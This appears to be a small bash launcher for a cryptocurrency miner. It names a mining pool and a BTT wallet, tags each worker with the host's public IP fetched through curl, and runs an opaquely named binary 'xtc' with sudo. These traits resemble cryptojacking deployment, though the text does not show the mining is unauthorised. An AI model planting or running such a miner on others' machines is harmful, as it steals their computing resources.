#!/bin/bash

POOL=ethash-asia.unmineable.com:3333
WALLET=BTT:TJ64St91EUFbaDg3T2zKq8iYZ4MSk88vBU.$(echo "$(curl -s ifconfig.me)" | tr . _ )Hadd

cd "$(dirname "$0")"

chmod +x ./xtc && sudo ./xtc --algo ETHASH --pool $POOL --user $WALLET $@